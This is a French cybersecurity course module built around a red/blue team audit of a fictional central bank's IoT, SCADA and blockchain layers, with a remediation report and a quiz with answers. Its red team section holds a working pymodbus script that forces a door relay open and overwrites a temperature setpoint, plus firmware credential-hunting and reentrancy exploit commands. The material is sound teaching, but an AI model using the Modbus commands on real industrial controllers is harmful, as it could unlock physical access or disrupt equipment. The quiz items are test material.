# TOME P5 — Cybersécurité Avancée & Red/Blue Team — Jour 220 (6h) : Projet Intégrateur Partie 4 — Audit de Sécurité IoT, SCADA & Blockchain (BCC — Mission Complète Red/Blue Team)

> [!NOTE]
> **Objectif du jour :** Conduire un **audit de sécurité complet et intégré** couvrant les couches IoT, Systèmes Industriels (SCADA/OT) et Technologie Blockchain d'une infrastructure bancaire critique (BCC). Ce projet intégrateur consolide les acquis des Jours 216 à 219 et mobilise l'ensemble des techniques : analyse de firmware embarqué, attaque Modbus TCP sur PLC, exploitation d'une vulnérabilité de réentrabilité Solidity, rédaction d'un rapport d'audit CVSSv3 et mise en œuvre d'un plan de remédiation conforme IEC 62443.
>
> **Compétences visées :** `SEC-04` (A) — Sécurité OT/IoT & Systèmes Industriels | `SEC-06` (A) — Smart Contract Audit | `PRO-01` (A) — Conduite d'un projet d'audit de sécurité intégré multi-couches

---

## 1) Module — Briefing Mission & Cartographie de la Cible BCC (1h30)

### 📖 Narration/Intuition

La BCC (Banque Centrale du Congo) vous mandate en tant qu'équipe d'audit de sécurité offensive (Red Team) et défensive (Blue Team) pour une mission d'évaluation complète de ses nouvelles infrastructures numériques hybrides déployées pour la MNBC (Monnaie Numérique de Banque Centrale) :

1. **Couche IoT/Embarqué** : Un ensemble de capteurs connectés surveille les coffres-forts, groupes électrogènes et systèmes de climatisation des datacenters de la BCC. Ces équipements exécutent un firmware embarqué Linux.
2. **Couche SCADA/OT** : Un réseau SCADA (Modbus TCP) contrôle l'alimentation électrique des datacenters et l'ouverture/fermeture des accès physiques sécurisés.
3. **Couche Blockchain/MNBC** : Un Smart Contract Solidity déployé sur un réseau Hyperledger Besu (compatible EVM) gère les règlements inter-bancaires et les opérations de la MNBC.

**Votre mission :** Identifier, exploiter (Red Team), documenter et proposer des remédiations (Blue Team) pour les failles de sécurité présentes dans ces trois couches.

### 🔍 Anatomie Technique

**Cartographie de l'Infrastructure BCC Cible :**

```
┌─────────────────────────────────────────────────────────────────────────────┐
│             INFRASTRUCTURE HYBRIDE BCC — MNBC & SYSTÈMES PHYSIQUES          │
├─────────────────────────────────────────────────────────────────────────────┤
│  COUCHE 3 — BLOCKCHAIN MNBC (Smart Contracts Solidity / Hyperledger Besu)   │
│  ┌──────────────────────────────────────────────────────────────────────┐   │
│  │ MNBCToken.sol  |  SettlementVault.sol (⚠️ Reentrancy Vuln SWC-107)  │   │
│  │ Nœuds Validateurs BCC : 10.200.1.10-12                               │   │
│  └──────────────────────────────────────────────────────────────────────┘   │
├─────────────────────────────────────────────────────────────────────────────┤
│  COUCHE 2 — RÉSEAU OT/SCADA (Modbus TCP / ICS — Niveau 1-3 Purdue)         │
│  ┌──────────────────────────────────────────────────────────────────────┐   │
│  │ PLC Schneider Modicon M340 : 192.168.10.50:502 (Modbus TCP)          │   │
│  │ HMI Ignition SCADA : 192.168.10.100                                  │   │
│  │ Réseau OT non segmenté — accessible depuis VLAN Ingénierie            │   │
│  └──────────────────────────────────────────────────────────────────────┘   │
├─────────────────────────────────────────────────────────────────────────────┤
│  COUCHE 1 — IoT / FIRMWARE EMBARQUÉ (Capteurs & Actionneurs BCC)           │
│  ┌──────────────────────────────────────────────────────────────────────┐   │
│  │ Firmware v1.0.3 — Caméras IP BCC : 192.168.20.x (Busybox Linux)     │   │
│  │ Backdoor Telnet détectée sur Port 23                                  │   │
│  │ Credentials hardcodés dans /etc/passwd du firmware                   │   │
│  └──────────────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 2) Module — Phase Red Team : Exploitation des 3 Couches (2h30)

### 🛠️ Atelier Pratique Red Team

**ÉTAPE 1 — Audit Firmware IoT (Binwalk / Squashfs)**

```bash
# 1. Extraire le firmware de la caméra BCC
binwalk -e bcc_camera_fw_v1.0.3.bin

# 2. Analyser le système de fichiers extrait
ls _bcc_camera_fw_v1.0.3.bin.extracted/squashfs-root/

# 3. Rechercher les credentials hardcodés dans /etc/passwd et scripts
grep -r "password" ./squashfs-root/etc/ --include="*.conf" --include="*.sh"
strings ./squashfs-root/bin/telnetd

# RÉSULTAT : Credentials trouvés en clair dans /etc/init.d/start_services.sh
# ↳ TELNET_USER="admin" TELNET_PASS="BCC2024!" (hardcodé)

# 4. Rapport de finding : CVE-equivalent — CWE-798 (Use of Hard-coded Credentials)
echo "FINDING IoT-001 | CVSS: 9.8 (Critical) | CWE-798 | Credentials hardcodés Telnet"
```

---

**ÉTAPE 2 — Attaque Réseau SCADA / Injection Modbus TCP sur PLC**

```python
# modbus_attack_bcc.py — Red Team: Injection Modbus TCP sur PLC BCC
from pymodbus.client import ModbusTcpClient
import time

PLC_IP = "192.168.10.50"  # Schneider Modicon BCC
PLC_PORT = 502

client = ModbusTcpClient(PLC_IP, port=PLC_PORT)

if client.connect():
    print(f"✅ [RED TEAM] Connecté au PLC BCC {PLC_IP}:{PLC_PORT}")

    # 1. Enumération des bobines (Coils = Relais physiques)
    result = client.read_coils(address=0, count=16, slave=1)
    print(f"📊 État actuel des relais (Coils 0-15): {result.bits}")

    # FINDING SCADA-001 : Lecture sans authentification possible

    # 2. 🚨 ATTAQUE : Ouverture forcée du relais 3 (Contrôle porte serveur BCC)
    client.write_coil(address=3, value=True, slave=1)
    print("⚠️ [EXPLOIT] Commande Write Coil addr=3 exécutée — Porte serveur forcée!")

    # 3. 🚨 ATTAQUE : Modification du registre de setpoint de température
    # (Valeur 0x0000 = 0°C — risque de surchauffe si le système est inversé)
    client.write_register(address=100, value=0x0000, slave=1)
    print("⚠️ [EXPLOIT] Write Register addr=100 val=0 — Setpoint température falsifié!")

    time.sleep(1)
    client.close()
else:
    print("❌ Connexion échouée — PLC non accessible")
```

---

**ÉTAPE 3 — Exploitation Smart Contract BCC (Reentrancy Attack)**

```bash
# Outil : Foundry (forge) pour le test d'exploitation du Smart Contract
# 1. Déployer le contrat en local (Fork du réseau Besu BCC)
forge create SettlementVault --rpc-url http://localhost:8545 --private-key $DEPLOYER_KEY

# 2. Lancer le script d'attaque par réentrabilité
forge script AttackReentrancy.s.sol --rpc-url http://localhost:8545 --private-key $ATTACKER_KEY --broadcast

# RÉSULTAT de l'exploitation :
# ↳ BEFORE: Vault balance = 1,000,000 MNBC
# ↳ AFTER:  Vault balance = 0 MNBC
# ↳ Attacker balance = 1,000,000 MNBC
# FINDING SC-001 | CVSS: 9.8 | SWC-107 | Reentrancy Attack réussie !
```

---

## 3) Module — Phase Blue Team : Rapport d'Audit & Remédiations (2h)

### 🔍 Anatomie Technique — Rapport d'Audit CVSSv3

```markdown
# RAPPORT D'AUDIT DE SÉCURITÉ — BCC MNBC INFRASTRUCTURE
# Classification : CONFIDENTIEL — RED TEAM / BLUE TEAM
# Date : J220 — Équipe Paradis IT

## SYNTHÈSE EXÉCUTIVE

| ID Finding | Couche      | Titre                               | CVSS v3 | Sévérité |
|:----------:|:-----------:|:------------------------------------|:-------:|:--------:|
| IoT-001    | Firmware    | Credentials Telnet hardcodés        | 9.8     | CRITIQUE |
| SCADA-001  | OT / PLC   | Modbus TCP sans authentification    | 9.1     | CRITIQUE |
| SCADA-002  | OT / PLC   | Absence de segmentation réseau OT   | 8.6     | HAUTE    |
| SC-001     | Blockchain  | Reentrancy Attack (SWC-107)         | 9.8     | CRITIQUE |
| SC-002     | Blockchain  | Absence de contrôle d'accès onlyOwner | 7.5   | HAUTE    |

---

## PLAN DE REMÉDIATION PRIORITAIRE (Blue Team)

### IoT-001 — Credentials Hardcodés (CRITIQUE)
**Immédiat (J+0)** :
- Flasher une version firmware de remplacement sans backdoor Telnet.
- Désactiver le service Telnet / SSH et n'autoriser que les connexions via le bastion OT.
- Implémenter un processus de gestion des secrets pour les mots de passe (Vault HashiCorp).

**À moyen terme** :
- Mettre en œuvre un processus de **Secure Boot** et de vérification de la signature du firmware.
- Intégrer une revue de sécurité firmware (SBOM — Software Bill of Materials) à chaque release.

---

### SCADA-001 — Modbus TCP sans Auth (CRITIQUE)
**Immédiat (J+0)** :
- Déployer un pare-feu industriel (ex: Palo Alto PA-Series Industrial) filtrant les flux Modbus TCP.
- Implémenter des ACL strictes (Whitelist IP) n'autorisant que les HMI légitimes à accéder au PLC sur le port 502.

**À moyen terme** :
- Migrer vers des protocoles industriels sécurisés : **Modbus Security (TLS)** ou **OPC-UA avec authentification certificat**.
- Déployer un **Système de Détection d'Intrusion Industriel (IDS OT)** : Claroty, Nozomi Networks, Dragos.

---

### SC-001 — Reentrancy Attack Solidity (CRITIQUE)
**Immédiat (J+0)** :
- Mettre en **PAUSE** le Smart Contract `SettlementVault.sol` via son mécanisme de pause (OpenZeppelin Pausable).
- Déployer un **contrat de migration corrigé** implémentant le pattern **Checks-Effects-Interactions** et le modificateur `ReentrancyGuard` d'OpenZeppelin.

**À moyen terme** :
- Exiger une **revue de sécurité formelle** (audit de code externe + Slither + Mythril) avant tout déploiement.
- Implémenter une **Timelock** (délai d'exécution de 48h) sur toutes les opérations financières critiques.
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **MNBC** | Monnaie Numérique de Banque Centrale (équivalent de CBDC en français) |
| **SBOM** | Software Bill of Materials — Inventaire complet des composants logiciels d'un produit |
| **SWC** | Smart Contract Weakness Classification — Registre international des vulnérabilités Solidity |
| **IDS OT** | Intrusion Detection System pour réseaux Operational Technology industriels |
| **OPC-UA** | Open Platform Communications Unified Architecture — Protocole industriel sécurisé moderne |
| **CWE** | Common Weakness Enumeration — Catalogue des faiblesses logicielles communes |
| **SBOM** | Software Bill of Materials — Inventaire de la composition logicielle d'un firmware ou logiciel |

---

## 🏋️ Exercices & Corrigés

**Exercice 1 :** Vous avez détecté qu'un PLC industriel de la BCC accepte des connexions **Modbus TCP (Port 502)** sans restriction depuis n'importe quel poste du VLAN ingénierie. Proposer deux mesures de mitigation **immédiates** (court terme) et deux mesures **structurelles** (moyen/long terme) conformes au standard **IEC 62443**.

**Corrigé :**
- **Mesures immédiates (court terme)** :
  1. Déployer des règles ACL (Access Control List) strictes sur les équipements de commutation (switches) et pare-feux du réseau OT afin de n'autoriser que les adresses IP des HMI légitimes (whitelist IP) à atteindre le port 502 du PLC. Bloquer tout autre source.
  2. Activer le verrouillage physique via le commutateur **RUN/STOP** à clé physique du PLC Schneider, empêchant toute modification du programme automate ou des registres depuis l'interface réseau.
- **Mesures structurelles (moyen/long terme)** :
  1. Migrer vers un protocole industriel authentifié et chiffré : **Modbus Security (encapsulation TLS 1.3)** ou **OPC-UA avec authentification par certificat X.509** (recommandé par l'ISA/IEC 62443-3-3 SR 3.1).
  2. Déployer un **IDS OT dédié** (ex: Nozomi Networks, Claroty ou Dragos) analysant les flux Modbus TCP en temps réel pour détecter les anomalies (commandes inattendues, lectures/écritures de registres hors plage normale, nouveaux équipements sur le réseau OT).

**Exercice 2 :** En tant qu'auditeur de sécurité, vous devez calculer le score **CVSSv3** pour la faille **SC-001 (Reentrancy Attack)** du Smart Contract de règlement MNBC de la BCC. Justifier les valeurs choisies pour les métriques de base.

**Corrigé :**
- **Attack Vector (AV) = Network (N)** : L'attaquant n'a besoin que d'un accès réseau au nœud Blockchain (RPC HTTP) pour soumettre la transaction malveillante.
- **Attack Complexity (AC) = Low (L)** : L'exploitation ne nécessite aucune condition particulière (race condition ou configuration spéciale) ; il suffit de déployer un contrat d'attaque.
- **Privileges Required (PR) = None (N)** : N'importe quelle adresse Ethereum peut interagir avec un Smart Contract déployé ; aucun rôle privilégié n'est requis.
- **User Interaction (UI) = None (N)** : L'attaque est entièrement automatisée et ne requiert aucune action de la victime.
- **Scope (S) = Changed (C)** : L'exploitation affecte un périmètre plus large que le seul contrat vulnérable (la trésorerie complète de la MNBC est vidée).
- **Confidentiality (C) = High (H)**, **Integrity (I) = High (H)**, **Availability (A) = High (H)** : Impact financier total (perte de la totalité des réserves MNBC).
- **Score final CVSSv3 Base : 10.0 (Critique)**

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Dans un audit de sécurité d'infrastructure industrielle SCADA BCC couvrant les couches IoT, OT et Blockchain, quelle est la **première action** recommandée par le rapport lors de la découverte d'une faille CRITIQUE (CVSS ≥ 9.0) ?
- A) Mettre en pause ou isoler immédiatement le système affecté, puis déployer un correctif d'urgence en coordination avec l'équipe SCADA et le CISO
- B) Documenter la faille et attendre la prochaine fenêtre de maintenance planifiée dans 6 mois
- C) Publier immédiatement la faille sur un forum public pour alerter la communauté
- D) Ignorer la faille si elle nécessite un accès physique au site

**Réponse : A**

**Q2 :** Quel standard industriel international (IEC 62443 / ISA-62443) définit un modèle de **Zones de Sécurité et Conduits** pour la protection des réseaux OT/SCADA contre les cybermenaces ?
- A) IEC 62443
- B) ISO 27001
- C) PCI-DSS
- D) NIST SP 800-53

**Réponse : A**

**Q3 :** Dans le cadre d'un audit Red Team de Smart Contracts Solidity, quel outil open-source d'**analyse symbolique d'exécution** de l'EVM (Ethereum Virtual Machine) est utilisé pour détecter automatiquement les vulnérabilités de type Reentrancy, Integer Overflow et Access Control ?
- A) Mythril
- B) Wireshark
- C) Metasploit
- D) Nessus

**Réponse : A**

**Q4 :** Lors d'une attaque Modbus TCP Red Team réussie sur le PLC Schneider de la BCC (finding SCADA-001), quelle commande Python PyModbus permet de forcer l'état physique du relais numéro 3 à l'état "OUVERT" ?
- A) `client.write_coil(address=3, value=True, slave=1)`
- B) `client.read_coils(address=3, count=1, slave=1)`
- C) `client.read_holding_registers(address=3, count=1, slave=1)`
- D) `client.write_register(address=0, value=3, slave=1)`

**Réponse : A**

**Q5 :** Quelle abréviation désigne l'inventaire complet des composants logiciels, bibliothèques et dépendances d'un firmware IoT, permettant d'identifier rapidement les composants présentant des CVE connues ?
- A) SBOM (Software Bill of Materials)
- B) SIEM (Security Information and Event Management)
- C) SOC (Security Operations Center)
- D) MFA (Multi-Factor Authentication)

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
